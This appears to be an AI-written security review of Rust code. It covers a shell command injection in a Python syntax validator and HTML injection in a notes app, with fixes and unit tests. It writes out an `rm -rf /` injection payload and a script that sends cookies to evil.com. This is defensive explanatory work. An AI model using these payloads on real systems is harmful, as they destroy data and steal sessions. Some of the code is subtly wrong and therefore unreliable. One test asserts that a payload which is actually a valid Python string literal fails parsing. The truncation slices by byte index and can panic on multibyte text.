response:
This has a P0 command injection vulnerability. The `code` variable is interpolated directly into a shell command string passed to `bash -c`. If the code contains a single quote, it breaks out of the `echo` string and executes arbitrary commands.

Attack: `code = "' && rm -rf / && echo '"` produces:
```bash
echo '' && rm -rf / && echo '' | python3 -c '...'
```

The `rm -rf /` executes before the pipe to python3.

Fix: pipe code via stdin using `Stdio::piped()`, never interpolate it into shell commands.

```rust
async fn validate_python(code: &str) -> anyhow::Result<bool> {
    use tokio::io::AsyncWriteExt;
    use tokio::process::Command;
    use std::process::Stdio;

    let script = "import ast, sys; ast.parse(sys.stdin.read())";
    let code_bytes = code.as_bytes().to_vec();

    let mut child = Command::new("python3")
        .arg("-c")
        .arg(script)  // Script is a constant, safe
        .stdin(Stdio::piped())   // Code goes through stdin
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    if let Some(mut stdin) = child.stdin.take() {
        let _ = stdin.write_all(&code_bytes).await;
        // Drop stdin to send EOF
    }

    let output = child.wait_with_output().await?;
    Ok(output.status.success())
}

#[tokio::test]
async fn test_p0_shell_injection_via_code_content() {
    let malicious = "' && echo PWNED && echo '";
    // With the fixed version, this is just invalid Python (single quotes aren't special via stdin)
    let result = validate_python(malicious).await.unwrap();
    assert!(!result, "Malicious code should fail Python syntax check, not execute shell commands");
}
```

The principle: never pass untrusted content through a shell. Use `Command::new()` with `.arg()` for arguments (no shell expansion), and `Stdio::piped()` for data. The shell never sees the code content.

When a notes application (like Apple Notes) uses HTML for rich text storage, injecting raw HTML through the content field is an XSS vector. The attack scenario: the model creates a note with content `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`. If the notes app renders this as HTML, the script executes.

```rust
/// Escape HTML special characters to prevent XSS in note content.
pub fn escape_html(input: &str) -> String {
    input
        .replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}

/// Sanitize note content: escape HTML, strip control chars, truncate.
pub fn sanitize_note_content(content: &str) -> String {
    let escaped = escape_html(content);
    // Convert newlines to <br> for proper rendering
    let with_breaks = escaped.replace('\n', "<br>");
    // Strip null bytes
    let clean = with_breaks.replace('\0', "");
    // Truncate extremely long content
    if clean.len() > 100_000 {
        format!("{}... [content truncated]", &clean[..100_000])
    } else {
        clean
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_script_tag_escaped() {
        let input = "<script>alert(document.cookie)</script>";
        let sanitized = sanitize_note_content(input);
        assert!(!sanitized.contains("<script>"));
        assert!(sanitized.contains("&lt;script&gt;"));
    }

    #[test]
    fn test_img_onerror_escaped() {
        let input = "<img src=x onerror=alert(1)>";
        let sanitized = sanitize_note_content(input);
        assert!(!sanitized.contains("<img"));
    }

    #[test]
    fn test_normal_text_preserved() {
        let input = "Meeting notes: discussed Q4 goals & budget";
        let sanitized = sanitize_note_content(input);
        assert!(sanitized.contains("Meeting notes"));
        assert!(sanitized.contains("&amp;")); // & is escaped
    }

    #[test]
    fn test_newlines_converted() {
        let input = "Line 1\nLine 2";
        let sanitized = sanitize_note_content(input);
        assert!(sanitized.contains("<br>"));
    }
}
```

The escape function must handle all five HTML special characters: `&`, `<`, `>`, `"`, `'`. The order matters: escape `&` first, otherwise `&lt;` from escaping `<` would get double-escaped to `&amp;lt;`.

